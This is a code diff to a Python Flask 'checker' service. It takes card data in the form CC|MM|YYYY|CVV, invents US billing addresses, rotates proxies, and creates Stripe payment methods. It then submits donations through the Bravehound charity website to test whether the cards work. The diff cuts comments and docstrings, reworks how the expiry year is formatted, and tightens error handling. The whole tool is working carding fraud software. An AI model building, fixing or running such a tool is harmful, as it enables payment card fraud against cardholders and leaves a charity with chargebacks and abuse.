@@ -46,48 +46,31 @@ class USAddressGenerator:
         }
 
 def format_proxy(proxy: str) -> str:
-    """
-    Support all proxy formats:
-    1. http://user:pass@ip:port
-    2. https://user:pass@ip:port
-    3. user:pass@ip:port
-    4. ip:port:user:pass
-    5. ip:port
-    6. user:pass@host:port
-    """
     if not proxy:
         return None
     
     proxy = proxy.strip()
     
-    # Already has http:// or https://
     if proxy.startswith('http://') or proxy.startswith('https://'):
         return proxy
     
-    # Format: user:pass@ip:port
     if '@' in proxy and ':' in proxy.split('@')[0]:
         return f"http://{proxy}"
     
-    # Format: ip:port:user:pass
     parts = proxy.split(':')
     if len(parts) == 4:
         ip, port, user, password = parts
-        # Check if ip contains dots (IPv4) or colons (IPv6)
         if '.' in ip or ':' in ip:
             return f"http://{user}:{password}@{ip}:{port}"
         else:
-            # Maybe format is user:pass:ip:port
             return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
     
-    # Format: ip:port (no auth)
     if len(parts) == 2:
         return f"http://{proxy}"
     
-    # Format: user:pass@host (no port)
     if '@' in proxy:
         return f"http://{proxy}"
     
-    # Default: return as is
     return f"http://{proxy}"
 
 class BravehoundDonationBot:
@@ -98,7 +81,7 @@ class BravehoundDonationBot:
             
         self.card_number = parts[0].strip()
         self.exp_month = parts[1].strip()
-        self.exp_year = parts[2].strip()  # Keep as string
+        self.exp_year = parts[2].strip()
         self.cvc = parts[3].strip()
         
         self.session = requests.Session()
@@ -137,27 +120,30 @@ class BravehoundDonationBot:
             'priority': "u=1, i",
         }
         response = self.session.post(url, data=payload, headers=headers)
-        self.form_hash = response.json()['data']['give_form_hash']
+        data = response.json()
+        self.form_hash = data['data']['give_form_hash']
         return self.form_hash
     
     def create_payment_method(self):
         url = "https://api.stripe.com/v1/payment_methods"
         
-        # Fix: Ensure exp_year is string and get last 2 digits
+        # Properly format exp_year
         exp_year_str = str(self.exp_year).strip()
-        if len(exp_year_str) >= 2:
-            exp_year_last2 = exp_year_str[-2:]
+        if len(exp_year_str) == 4:
+            exp_year = exp_year_str[-2:]
+        elif len(exp_year_str) == 2:
+            exp_year = exp_year_str
         else:
-            exp_year_last2 = exp_year_str.zfill(2)
+            exp_year = exp_year_str.zfill(2)
         
         payload = {
             'type': "card",
             'billing_details[name]': f"{self.address['first_name']} {self.address['last_name']}",
             'billing_details[email]': self.address['email'],
-            'card[number]': str(self.card_number).strip(),
-            'card[cvc]': str(self.cvc).strip(),
-            'card[exp_month]': str(self.exp_month).strip(),
-            'card[exp_year]': exp_year_last2,
+            'card[number]': str(self.card_number),
+            'card[cvc]': str(self.cvc),
+            'card[exp_month]': str(self.exp_month),
+            'card[exp_year]': exp_year,
             'guid': "c2d15411-4ea6-4412-96f9-5964b19feacc9a03e0",
             'muid': "2cbebced-2e78-43c8-8df0-d77c88f32d7effd1d6",
             'sid': "515d1b26-d906-4b1d-a218-e9cb37dbceebeed15b",
@@ -188,12 +174,24 @@ class BravehoundDonationBot:
         
         try:
             response = self.session.post(url, data=payload, headers=headers)
-            response.raise_for_status()
-            result = response.json()
+            
+            # Check if response is valid JSON
+            if response.status_code != 200:
+                raise Exception(f"Stripe API returned status {response.status_code}: {response.text}")
+            
+            try:
+                result = response.json()
+            except json.JSONDecodeError:
+                raise Exception(f"Invalid JSON response from Stripe: {response.text[:200]}")
+            
+            if 'id' not in result:
+                raise Exception(f"Missing 'id' in Stripe response: {result}")
+            
             self.payment_method_id = result['id']
             return self.payment_method_id
+            
         except Exception as e:
-            raise Exception(f"Stripe payment method creation failed: {str(e)}")
+            raise Exception(f"Payment method creation failed: {str(e)}")
     
     def submit_donation(self):
         url = "https://www.bravehound.co.uk/donation/"
@@ -289,7 +287,6 @@ class BravehoundDonationBot:
             }
 
 def parse_cc_string(cc_string):
-    """Parse CC string in format CC|MM|YYYY|CVV"""
     parts = cc_string.split('|')
     if len(parts) != 4:
         raise ValueError("Invalid format. Expected: CC|MM|YYYY|CVV")
@@ -303,16 +300,6 @@ def parse_cc_string(cc_string):
 
 @app.route('/check', methods=['GET'])
 def bravehound_checker():
-    """
-    Check credit card with Bravehound donation
-    GET Parameters:
-        - cc: Required. Format: CC|MM|YYYY|CVV
-        - proxy: Optional. Supports all formats:
-            * http://user:pass@ip:port
-            * user:pass@ip:port
-            * ip:port:user:pass
-            * ip:port
-    """
     try:
         cc_string = request.args.get('cc')
         proxy_str = request.args.get('proxy')
